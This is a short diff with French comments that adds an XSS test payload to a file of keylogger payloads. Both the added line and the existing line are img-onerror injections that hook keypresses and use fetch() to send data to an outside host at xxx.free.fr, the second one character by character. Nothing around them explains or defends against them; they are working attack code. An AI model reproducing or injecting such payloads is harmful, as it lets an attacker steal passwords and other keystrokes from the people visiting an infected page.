@@ -1,3 +1,5 @@
+// tester si le keylogger peut marcher
+<img src=x onerror='document.onkeypress=function(e){fetch("http://xxx.free.fr/test/a.php?c=blopblop")},this.remove();'> 
 
 // Keylogger sans compteur
 <img src=x onerror='document.onkeypress=function(e){fetch("http://xxx.free.fr/test/a.php?c="+String.fromCharCode(e.which))},this.remove();'>
